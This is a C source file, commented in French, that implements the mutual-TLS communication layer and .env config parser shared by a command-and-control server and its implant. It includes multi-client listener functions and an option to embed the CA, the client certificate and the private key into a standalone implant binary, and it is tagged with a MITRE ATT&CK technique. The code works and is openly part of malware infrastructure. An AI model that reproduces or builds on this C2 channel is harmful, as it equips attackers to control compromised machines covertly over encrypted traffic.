/*
 * tls.c — Module TLS portable (Linux + Windows) avec parseur de config .env.
 *
 * Ce fichier est partagé entre le C2 (c2_server.c) et l'implant (implant.c).
 * Il fournit :
 *   1. Un parseur de fichier .env (clé=valeur) pour la configuration.
 *   2. Une couche d'abstraction TLS/mTLS au-dessus d'OpenSSL.
 *
 * Portabilité :
 *   - Linux  : sockets POSIX (sys/socket.h, arpa/inet.h)
 *   - Windows : Winsock2 (winsock2.h, ws2tcpip.h), nécessite -lws2_32
 *
 * TLS mutuel (mTLS) :
 *   Le serveur ET le client présentent un certificat signé par la même CA.
 *   Cela garantit que seuls les implants légitimes peuvent se connecter au C2,
 *   et que l'implant est bien connecté au bon C2 (pas un MITM).
 *
 *   Chaîne de confiance :
 *     CA (ca.crt) ──┬── signe → server.crt (C2)
 *                    └── signe → client.crt (implant)
 *
 * Fonctions exposées (voir tls.h) :
 *   cfg_load / cfg_get / cfg_port  — configuration
 *   tls_init / tls_cleanup         — init/cleanup réseau
 *   tls_connect                    — connexion client (fichiers certs)
 *   tls_connect_embedded           — connexion client (certs en mémoire)
 *   tls_accept_one                 — serveur mono-client (legacy)
 *   tls_listen / tls_accept_on     — serveur multi-client
 *   tls_send / tls_recv            — envoi/réception chiffrée
 *   tls_close                      — fermeture + libération mémoire
 *
 * MITRE ATT&CK :
 *   T1573.001 — Encrypted Channel: Symmetric Cryptography (TLS)
 */

/* ====================== Includes réseau (portables) ====================== */
#ifdef _WIN32
#  include <winsock2.h>   /* socket, connect, bind, listen, accept     */
#  include <ws2tcpip.h>   /* inet_pton                                  */
#  include <windows.h>    /* GetEnvironmentVariableA                    */
   typedef SOCKET sock_t;
#  define INVALID_SOCK INVALID_SOCKET
#  define CLOSE_SOCK(s) closesocket(s)
#else
#  include <arpa/inet.h>
#  include <netinet/in.h>
#  include <sys/socket.h>
#  include <unistd.h>
   typedef int sock_t;
#  define INVALID_SOCK (-1)
#  define CLOSE_SOCK(s) close(s)
#endif

#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/x509.h>   /* X509, X509_STORE — pour les certs en mémoire */
#include <openssl/pem.h>    /* PEM_read_bio_X509, PEM_read_bio_PrivateKey   */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "tls.h"

/* ====================== Configuration (.env) ====================== */

/*
 * Parseur minimaliste de fichier .env (format clé=valeur).
 *
 * Supporte :
 *   - Commentaires (#)
 *   - Valeurs entre guillemets simples ou doubles (retirés)
 *   - Espaces autour de la clé et de la valeur (trimés)
 *
 * Ordre de recherche pour cfg_get() :
 *   1. Fichier .env (chargé par cfg_load)
 *   2. Variables d'environnement système
 *   3. Valeur par défaut passée en argument
 */

#define CFG_MAX    64    /* nombre max de paires clé=valeur */
#define CFG_KEYLEN 64    /* longueur max d'une clé          */
#define CFG_VALLEN 256   /* longueur max d'une valeur       */

static struct {
    char key[CFG_KEYLEN];
    char val[CFG_VALLEN];
} g_cfg[CFG_MAX];

static int  g_cfg_count  = 0;
static char g_env_buf[CFG_VALLEN]; /* buffer pour les variables d'environnement */

/* Supprime les espaces, tabs et retours chariot en début et fin de chaîne */
static char *trim(char *s) {
    char *end;
    while (*s == ' ' || *s == '\t') s++;
    end = s + strlen(s);
    while (end > s &&
           (end[-1] == ' ' || end[-1] == '\t' ||
            end[-1] == '\r' || end[-1] == '\n'))
        *--end = '\0';
    return s;
}

/*
 * cfg_load — Charge un fichier .env dans le tableau g_cfg[].
 * Retourne 0 si OK, -1 si le fichier n'existe pas (non fatal).
 */
int cfg_load(const char *path) {
    char  line[CFG_KEYLEN + CFG_VALLEN + 8];
    FILE *f;

#ifdef _WIN32
    if (fopen_s(&f, path, "r") != 0 || f == NULL) return -1;
#else
    f = fopen(path, "r");
    if (!f) return -1;
#endif

    while (fgets(line, sizeof(line), f) != NULL && g_cfg_count < CFG_MAX) {
        char  *eq, *k, *v;
        size_t vl;
        k = trim(line);
        if (*k == '\0' || *k == '#') continue;  /* ligne vide ou commentaire */
        eq = strchr(k, '=');
        if (!eq) continue;                       /* pas de '=' → ignorée     */
        *eq = '\0';
        k   = trim(k);
        v   = trim(eq + 1);
        /* Retire les guillemets encadrants ("val" ou 'val' → val) */
        vl  = strlen(v);
        if (vl >= 2 && (v[0] == '"' || v[0] == '\'') && v[vl - 1] == v[0]) {
            v[vl - 1] = '\0';
            v++;
        }
#ifdef _WIN32
        strncpy_s(g_cfg[g_cfg_count].key, CFG_KEYLEN, k, _TRUNCATE);
        strncpy_s(g_cfg[g_cfg_count].val, CFG_VALLEN, v, _TRUNCATE);
#else
        strncpy(g_cfg[g_cfg_count].key, k, CFG_KEYLEN - 1);
        g_cfg[g_cfg_count].key[CFG_KEYLEN - 1] = '\0';
        strncpy(g_cfg[g_cfg_count].val, v, CFG_VALLEN - 1);
        g_cfg[g_cfg_count].val[CFG_VALLEN - 1] = '\0';
#endif
        g_cfg_count++;
    }
    fclose(f);
    return 0;
}

/*
 * cfg_get — Retourne la valeur associée à 'key'.
 * Cherche d'abord dans le .env, puis dans les variables d'environnement,
 * et enfin retourne 'def' si introuvable.
 */
const char *cfg_get(const char *key, const char *def) {
    int i;
    /* Recherche dans le .env (dernier match gagne, pour supporter les overrides) */
    for (i = g_cfg_count - 1; i >= 0; i--)
        if (strcmp(g_cfg[i].key, key) == 0)
            return g_cfg[i].val;

    /* Fallback : variable d'environnement système */
#ifdef _WIN32
    {
        DWORD n = GetEnvironmentVariableA(key, g_env_buf, (DWORD)sizeof(g_env_buf));
        if (n > 0 && n < sizeof(g_env_buf)) return g_env_buf;
    }
#else
    {
        char *env = getenv(key);
        if (env) {
            strncpy(g_env_buf, env, CFG_VALLEN - 1);
            g_env_buf[CFG_VALLEN - 1] = '\0';
            return g_env_buf;
        }
    }
#endif
    return def;
}

/* cfg_port — Retourne SERVER_PORT depuis la config, ou 4444 par défaut */
int cfg_port(void) {
    long p = strtol(cfg_get("SERVER_PORT", "4444"), NULL, 10);
    return (p > 0 && p <= 65535) ? (int)p : 4444;
}

/* ====================== TLS ====================== */

/* Structure opaque pour une connexion TLS.
 * Encapsule le contexte SSL, l'objet SSL et le socket TCP. */
struct tls_conn {
    SSL_CTX *ctx;    /* contexte SSL (certs, clés, paramètres)    */
    SSL     *ssl;    /* session SSL (handshake, chiffrement)       */
    sock_t   sock;   /* socket TCP sous-jacent                     */
};

/*
 * tls_init — Initialise la couche réseau.
 * Sur Windows, appelle WSAStartup (obligatoire avant tout appel Winsock).
 * Sur Linux, no-op.
 */
int tls_init(void) {
#ifdef _WIN32
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0 ? 0 : -1;
#else
    return 0;
#endif
}

/* tls_cleanup — Libère la couche réseau (WSACleanup sur Windows) */
void tls_cleanup(void) {
#ifdef _WIN32
    WSACleanup();
#endif
}

/* tls_close — Ferme une connexion TLS et libère toute la mémoire */
void tls_close(tls_conn *c) {
    if (!c) return;
    if (c->ssl) { SSL_shutdown(c->ssl); SSL_free(c->ssl); }
    if (c->sock != INVALID_SOCK) CLOSE_SOCK(c->sock);
    if (c->ctx)  SSL_CTX_free(c->ctx);
    free(c);
}

/* ---- Fonctions internes ---- */

/*
 * make_ctx — Crée un SSL_CTX configuré pour mTLS depuis des FICHIERS PEM.
 *
 * Paramètres :
 *   server = 1 pour le C2 (TLS_server_method), 0 pour l'implant (TLS_client_method)
 *   cert   = chemin du certificat (server.crt ou client.crt)
 *   key    = chemin de la clé privée (server.key ou client.key)
 *
 * La CA est lue depuis cfg_get("CA_CERT", "certs/ca.crt").
 *
 * Côté serveur : SSL_VERIFY_FAIL_IF_NO_PEER_CERT exige que le client
 * présente un certificat (sinon le handshake échoue).
 */
static SSL_CTX *make_ctx(int server, const char *cert, const char *key) {
    const char *ca  = cfg_get("CA_CERT", "certs/ca.crt");
    SSL_CTX    *ctx = SSL_CTX_new(server ? TLS_server_method() : TLS_client_method());
    if (!ctx) { ERR_print_errors_fp(stderr); return NULL; }

    if (SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION)              != 1 ||
        SSL_CTX_load_verify_locations(ctx, ca, NULL)                    != 1 ||
        SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM)       != 1 ||
        SSL_CTX_use_PrivateKey_file(ctx, key,  SSL_FILETYPE_PEM)        != 1 ||
        SSL_CTX_check_private_key(ctx)                                  != 1) {
        fprintf(stderr, "[TLS] Certificats invalides (CA=%s cert=%s key=%s)\n",
                ca, cert, key);
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return NULL;
    }
    SSL_CTX_set_verify(ctx,
        server ? (SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT) : SSL_VERIFY_PEER,
        NULL);
    return ctx;
}

#ifdef EMBED_CERTS
/*
 * make_ctx_mem — Crée un SSL_CTX pour mTLS depuis des certs EN MÉMOIRE.
 *
 * Utilisé en mode standalone (-DEMBED_CERTS) : les certificats sont
 * compilés dans le binaire sous forme de tableaux d'octets (embedded_certs.h).
 *
 * Charge la CA, le cert client et la clé privée via des BIO mémoire
 * (BIO_new_mem_buf) au lieu de fichiers. Client-only (TLS_client_method).
 */
static SSL_CTX *make_ctx_mem(const unsigned char *ca, int ca_len,
                             const unsigned char *cert, int cert_len,
                             const unsigned char *key, int key_len)
{
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { ERR_print_errors_fp(stderr); return NULL; }

    if (SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION) != 1)
        goto err;

    /* Charge la CA depuis la mémoire → ajoutée au trust store */
    {
        BIO *bio = BIO_new_mem_buf(ca, ca_len);
        X509 *x = PEM_read_bio_X509(bio, NULL, NULL, NULL);
        BIO_free(bio);
        if (!x) goto err;
        X509_STORE_add_cert(SSL_CTX_get_cert_store(ctx), x);
        X509_free(x);
    }

    /* Charge le certificat client depuis la mémoire */
    {
        BIO *bio = BIO_new_mem_buf(cert, cert_len);
        X509 *x = PEM_read_bio_X509(bio, NULL, NULL, NULL);
        BIO_free(bio);
        if (!x || SSL_CTX_use_certificate(ctx, x) != 1) {
            X509_free(x); goto err;
        }
        X509_free(x);
    }

    /* Charge la clé privée client depuis la mémoire */
    {
        BIO *bio = BIO_new_mem_buf(key, key_len);
        EVP_PKEY *pk = PEM_read_bio_PrivateKey(bio, NULL, NULL, NULL);
        BIO_free(bio);
        if (!pk || SSL_CTX_use_PrivateKey(ctx, pk) != 1) {
            EVP_PKEY_free(pk); goto err;
        }
        EVP_PKEY_free(pk);
    }

    if (SSL_CTX_check_private_key(ctx) != 1) goto err;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
    return ctx;

err:
    fprintf(stderr, "[TLS] Embedded certs loading failed\n");
    ERR_print_errors_fp(stderr);
    SSL_CTX_free(ctx);
    return NULL;
}
#endif /* EMBED_CERTS */

/* Alloue une tls_conn vide avec le socket initialisé à INVALID */
static tls_conn *new_conn(void) {
    tls_conn *c = (tls_conn *)calloc(1, sizeof(*c));
    if (c) c->sock = INVALID_SOCK;
    return c;
}

/* Remplit une struct sockaddr_in depuis une IP et un port */
static int make_addr(const char *ip, int port, struct sockaddr_in *a) {
    memset(a, 0, sizeof(*a));
    a->sin_family = AF_INET;
    a->sin_port   = htons((unsigned short)port);
    if (inet_pton(AF_INET, ip, &a->sin_addr) != 1) {
        fprintf(stderr, "[TLS] Adresse IP invalide : %s\n", ip);
        return -1;
    }
    return 0;
}

/* ---- Fonctions client (implant) ---- */

/*
 * tls_connect — Connexion TLS client avec certs chargés depuis des fichiers.
 *
 * Étapes :
 *   1. Crée le contexte SSL avec les certs client (CLIENT_CERT, CLIENT_KEY)
 *   2. Ouvre un socket TCP et se connecte à ip:port
 *   3. Effectue le handshake TLS (mTLS : vérifie le cert serveur,
 *      présente le cert client)
 *   4. Retourne la connexion prête à envoyer/recevoir, ou NULL si échec
 */
tls_conn *tls_connect(const char *ip, int port) {
    struct sockaddr_in addr;
    tls_conn          *c;

    if (make_addr(ip, port, &addr) != 0) return NULL;
    c = new_conn();
    if (!c) return NULL;

    c->ctx = make_ctx(0,
                      cfg_get("CLIENT_CERT", "certs/client.crt"),
                      cfg_get("CLIENT_KEY",  "certs/client.key"));
    if (!c->ctx) goto fail;

    c->ssl = SSL_new(c->ctx);
    if (!c->ssl) {
        ERR_print_errors_fp(stderr); goto fail;
    }

    c->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (c->sock == INVALID_SOCK ||
        connect(c->sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
#ifdef _WIN32
        fprintf(stderr, "[TLS] connect échoué (%d)\n", WSAGetLastError());
#else
        perror("[TLS] connect");
#endif
        goto fail;
    }

    if (SSL_set_fd(c->ssl, (int)c->sock) != 1 || SSL_connect(c->ssl) != 1) {
        fprintf(stderr, "[TLS] Handshake échoué : %s\n",
                X509_verify_cert_error_string(SSL_get_verify_result(c->ssl)));
        ERR_print_errors_fp(stderr);
        goto fail;
    }
    return c;

fail:
    tls_close(c);
    return NULL;
}

#ifdef EMBED_CERTS
/*
 * tls_connect_embedded — Connexion TLS client avec certs en mémoire.
 * Identique à tls_connect mais utilise make_ctx_mem au lieu de make_ctx.
 * Utilisé en mode standalone (-DEMBED_CERTS).
 */
tls_conn *tls_connect_embedded(const char *ip, int port,
                               const unsigned char *ca, int ca_len,
                               const unsigned char *cert, int cert_len,
                               const unsigned char *key, int key_len)
{
    struct sockaddr_in addr;
    tls_conn          *c;

    if (make_addr(ip, port, &addr) != 0) return NULL;
    c = new_conn();
    if (!c) return NULL;

    c->ctx = make_ctx_mem(ca, ca_len, cert, cert_len, key, key_len);
    if (!c->ctx) goto fail;

    c->ssl = SSL_new(c->ctx);
    if (!c->ssl) { ERR_print_errors_fp(stderr); goto fail; }

    c->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (c->sock == INVALID_SOCK ||
        connect(c->sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
#ifdef _WIN32
        fprintf(stderr, "[TLS] connect échoué (%d)\n", WSAGetLastError());
#else
        perror("[TLS] connect");
#endif
        goto fail;
    }

    if (SSL_set_fd(c->ssl, (int)c->sock) != 1 || SSL_connect(c->ssl) != 1) {
        fprintf(stderr, "[TLS] Handshake échoué : %s\n",
                X509_verify_cert_error_string(SSL_get_verify_result(c->ssl)));
        ERR_print_errors_fp(stderr);
        goto fail;
    }
    return c;

fail:
    tls_close(c);
    return NULL;
}
#endif /* EMBED_CERTS */

/* ---- Fonctions serveur (C2) ---- */

/*
 * tls_accept_one — Serveur mono-client (legacy).
 *
 * Crée un socket d'écoute, accepte UNE connexion TLS, puis ferme le listener.
 * Utilisé par l'ancien C2 mono-client. Le nouveau C2 multi-client utilise
 * tls_listen + tls_accept_on à la place.
 */
tls_conn *tls_accept_one(const char *ip, int port) {
    struct sockaddr_in addr;
    sock_t             listener = INVALID_SOCK;
    tls_conn          *c;
#ifndef _WIN32
    int opt = 1;
#endif

    if (make_addr(ip, port, &addr) != 0) return NULL;
    c = new_conn();
    if (!c) return NULL;

    c->ctx = make_ctx(1,
                      cfg_get("SERVER_CERT", "certs/server.crt"),
                      cfg_get("SERVER_KEY",  "certs/server.key"));
    if (!c->ctx) goto fail;

    listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listener == INVALID_SOCK) { perror("[TLS] socket"); goto fail; }

#ifndef _WIN32
    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#else
    {
        BOOL b = TRUE;
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (const char *)&b, sizeof(b));
    }
#endif

    if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
        listen(listener, 1) != 0) {
#ifdef _WIN32
        fprintf(stderr, "[TLS] bind/listen échoué (%d)\n", WSAGetLastError());
#else
        perror("[TLS] bind/listen");
#endif
        goto fail;
    }
    printf("[TLS] Écoute sur %s:%d\n", ip, port);
    fflush(stdout);

    c->sock = accept(listener, NULL, NULL);
    CLOSE_SOCK(listener);
    listener = INVALID_SOCK;

    if (c->sock == INVALID_SOCK) { perror("[TLS] accept"); goto fail; }

    c->ssl = SSL_new(c->ctx);
    if (!c->ssl || SSL_set_fd(c->ssl, (int)c->sock) != 1 || SSL_accept(c->ssl) != 1) {
        fprintf(stderr, "[TLS] Handshake refusé\n");
        ERR_print_errors_fp(stderr);
        goto fail;
    }
    return c;

fail:
    if (listener != INVALID_SOCK) CLOSE_SOCK(listener);
    tls_close(c);
    return NULL;
}

/*
 * tls_listen — Crée un socket d'écoute TCP (bind + listen).
 *
 * Retourne le file descriptor du listener, utilisable avec tls_accept_on.
 * Le backlog est de 8 connexions en attente.
 * Utilisé par le C2 multi-client avec un thread d'accept séparé.
 */
int tls_listen(const char *ip, int port) {
    struct sockaddr_in addr;
    sock_t listener;
#ifndef _WIN32
    int opt = 1;
#endif

    if (make_addr(ip, port, &addr) != 0) return -1;
    listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listener == INVALID_SOCK) { perror("[TLS] socket"); return -1; }

#ifndef _WIN32
    setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#else
    { BOOL b = TRUE; setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (const char *)&b, sizeof(b)); }
#endif

    if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
        listen(listener, 8) != 0) {
        perror("[TLS] bind/listen");
        CLOSE_SOCK(listener);
        return -1;
    }
    printf("[TLS] Écoute sur %s:%d\n", ip, port);
    fflush(stdout);
    return (int)listener;
}

/*
 * tls_accept_on — Accepte une connexion TLS sur un listener existant.
 *
 * Bloque jusqu'à ce qu'un client se connecte. Effectue le handshake mTLS
 * (vérifie que le client présente un cert signé par notre CA).
 * Retourne une tls_conn prête, ou NULL si le handshake échoue.
 *
 * Utilisé dans la boucle du thread d'accept du C2 multi-client.
 */
tls_conn *tls_accept_on(int listener_fd) {
    tls_conn *c = new_conn();
    if (!c) return NULL;

    c->ctx = make_ctx(1,
                      cfg_get("SERVER_CERT", "certs/server.crt"),
                      cfg_get("SERVER_KEY",  "certs/server.key"));
    if (!c->ctx) { free(c); return NULL; }

    c->sock = accept((sock_t)listener_fd, NULL, NULL);
    if (c->sock == INVALID_SOCK) { perror("[TLS] accept"); tls_close(c); return NULL; }

    c->ssl = SSL_new(c->ctx);
    if (!c->ssl || SSL_set_fd(c->ssl, (int)c->sock) != 1 || SSL_accept(c->ssl) != 1) {
        fprintf(stderr, "[TLS] Handshake refusé\n");
        ERR_print_errors_fp(stderr);
        tls_close(c);
        return NULL;
    }
    return c;
}

/* ---- Envoi / Réception ---- */

/* tls_send — Envoie 'len' octets chiffrés via TLS. Retourne nb octets envoyés. */
int tls_send(tls_conn *c, const void *data, int len) {
    int n = SSL_write(c->ssl, data, len);
    if (n <= 0) ERR_print_errors_fp(stderr);
    return n;
}

/* tls_recv — Reçoit jusqu'à 'max' octets chiffrés via TLS. Retourne nb octets lus. */
int tls_recv(tls_conn *c, void *buf, int max) {
    int n = SSL_read(c->ssl, buf, max);
    if (n <= 0) ERR_print_errors_fp(stderr);
    return n;
}

/* tls_version — Retourne la version TLS négociée ("TLSv1.3" ou "TLSv1.2") */
const char *tls_version(tls_conn *c) { return SSL_get_version(c->ssl); }
